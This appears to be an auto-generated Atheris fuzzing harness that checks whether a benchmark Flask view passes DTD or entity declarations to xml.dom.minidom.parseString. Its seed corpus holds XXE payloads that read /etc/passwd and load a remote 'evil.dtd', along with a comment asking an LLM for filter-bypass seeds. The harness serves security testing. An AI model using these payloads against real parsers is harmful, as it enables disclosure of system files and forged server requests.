# AUTO-GENERATED ATHERIS HARNESS
# rule_id  : py/xml-bomb
# function : BenchmarkTest00017_post
# file     : testcode/BenchmarkTest00017.py
# ================================================================
import atheris
import sys
import re
import os


from unittest.mock import patch, MagicMock



REPO_ROOT = "/home/tuonglnc/repo/VulnHunterX/repos/python/benchmark-python"
if REPO_ROOT and REPO_ROOT not in sys.path:
    sys.path.insert(0, REPO_ROOT)

with atheris.instrument_imports():

    from testcode.BenchmarkTest00017 import BenchmarkTest00017_post


# === FIXED CONTRACTS (DO NOT MODIFY) ===
_COMPILED_PATTERNS = [

    re.compile("[\\s\\S]+", re.IGNORECASE),

]
_RAISE_MESSAGE  = "ORACULUM_VIOLATION: captured={captured}"
_TAINTED_PARAMS = [{"name": "request", "index": -1, "type": "flask_request"}]
# ========================================

# === ORACLE CONTEXT ===
# strategy         : recorded_call
# patch_target     : xml.dom.minidom.parseString
# target_arg_index : 0
# target_arg_name  : xmlString
# input_strategy   : flask_view
# signature        : def BenchmarkTest00017_post()
# condition        : lambda xmlString: isinstance(xmlString, str) and ('<!ENTITY' in xmlString or 'DTD' in xmlString or '<!ELEMENT' in xmlString)
# capture_what     : xmlString
# skip_hint        : False
# ========================================


# === RECORDED_CALL SKELETON ===
# 1. INPUT GENERATION
#    - Generate inputs for tainted params using FuzzedDataProvider.
#    - For MULTIPLE params: split the buffer proportionally by param count.
#      For str/bytes params divide remaining bytes evenly; consume the last
#      str/bytes param with remaining bytes. Fixed-size types (int, float,
#      bool) consume their natural byte width first.
#      FORBIDDEN: Do NOT use ConsumeIntInRange() to index a strategy or branch.
#    - DO NOT embed a seed list inside TestOneInput or use ConsumeBool() to
#      select from a hardcoded list — seeds are managed externally in _SEED_CORPUS.
#
# 2. SKIP CONDITION
#    - Apply skip_hint early, return immediately if not met.
#
# 3. MOCK SETUP
#    - Patch `xml.dom.minidom.parseString` using `with patch(...) as mock_get:`.
#    - Return a realistic MagicMock so the function continues past the patched call.
#
# 4. ORACLE CHECK
#    - After the call, iterate mock_get.call_args_list.
#    - For each call: check call.args[0] first,
#      fall back to call.kwargs.get("xmlString").
#    - Match against every pattern in _COMPILED_PATTERNS.
#    - On match → raise RuntimeError(_RAISE_MESSAGE)
#
# 5. EXCEPTION HANDLING
#    - except RuntimeError: raise   → never swallow oracle signals
#    - except Exception:    return  → only around the target function call
# ==========================================



def TestOneInput(data):
    fdp = atheris.FuzzedDataProvider(data)
    
    # 1. INPUT GENERATION
    # Only one tainted param: "request" of type flask_request
    request_data = fdp.ConsumeUnicodeNoSurrogates(sys.maxsize)
    
    # Early exit for empty or obviously invalid inputs
    if not request_data:
        return

    # 2. SKIP CONDITION
    # skip_hint is False, so we don't skip

    # 3. MOCK SETUP
    with patch('xml.dom.minidom.parseString', MagicMock()) as mock_parseString:
        try:
            # Create a mock request object with the fuzzed data
            class MockRequest:
                def __init__(self, data):
                    self.data = data
                    self.form = {}
                    self.args = {}
                    self.json = None
                    self.values = {}
                    self.headers = {}
                    self.cookies = {}
                    self.files = {}
                    # Simulate a get_data method that returns the fuzzed data
                    self._data = data.encode('utf-8') if isinstance(data, str) else data

                def get_data(self, as_text=False):
                    if as_text:
                        return self.data
                    return self._data

            mock_request = MockRequest(request_data)

            # Temporarily replace the request in the function's module
            import testcode.BenchmarkTest00017 as test_module
            original_request = getattr(test_module, 'request', None)
            test_module.request = mock_request

            try:
                # Call the target function
                BenchmarkTest00017_post()
            finally:
                # Restore original request
                if original_request is not None:
                    test_module.request = original_request
                else:
                    delattr(test_module, 'request')

        except Exception:
            # Only catch non-oracle exceptions around the target function call
            return

        # 4. ORACLE CHECK
        for call in mock_parseString.call_args_list:
            # Get the xmlString argument (index 0 or keyword 'xmlString')
            xmlString = None
            if call.args and len(call.args) > 0:
                xmlString = call.args[0]
            elif 'xmlString' in call.kwargs:
                xmlString = call.kwargs['xmlString']
            
            if xmlString is not None:
                # Check against oracle condition
                if isinstance(xmlString, str) and ('<!ENTITY' in xmlString or 'DTD' in xmlString or '<!ELEMENT' in xmlString):
                    # Match against patterns
                    for pattern in _COMPILED_PATTERNS:
                        if pattern.search(str(xmlString)):
                            raise RuntimeError(_RAISE_MESSAGE.format(captured=repr(xmlString)))

    # 5. EXCEPTION HANDLING
    # RuntimeError is not caught here, so it will propagate up


# === SEED CORPUS — bypass-oriented, derived from trigger_patterns ===
# LLM: populate _SEED_CORPUS with entries designed to SURVIVE the filter,
# not just trigger it. Cover: mixed case, whitespace injection, unicode
# homoglyphs, double encoding, tag nesting, attribute abuse.
_SEED_CORPUS = [
    '<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>',
    '<!DOCTYPE test [ <!ELEMENT data (#PCDATA)> ]>',
    '<!DOCTYPE note [ <!ENTITY x "Hello"> ]>',
    '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [ <!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "file:///etc/passwd" >]><foo>&xxe;</foo>',
    '<!DOCTYPE blah [ <!ENTITY % dtd SYSTEM "http://example.com/evil.dtd" > %dtd; ]>',
    '<root><![CDATA[<!ENTITY x "y">]]></root>',
]


if __name__ == "__main__":
    # Export seed corpus to disk so libFuzzer can mutate raw bytes directly.
    # This preserves coverage-guided mutation — fuzzer mutates content, not index.
    _CORPUS_DIR = "output/python/benchmark-python/fuzz_corpus/py_xml_bomb_testcode_BenchmarkTest00017_py_52"
    os.makedirs(_CORPUS_DIR, exist_ok=True)
    for _i, _seed in enumerate(_SEED_CORPUS):
        _seed_path = os.path.join(_CORPUS_DIR, f"seed_{_i:03d}")
        if not os.path.exists(_seed_path):
            with open(_seed_path, "wb") as _f:
                _f.write(_seed.encode("utf-8"))

    if _CORPUS_DIR not in sys.argv:
        sys.argv.append(_CORPUS_DIR)

    atheris.Setup(sys.argv, TestOneInput)
    atheris.Fuzz()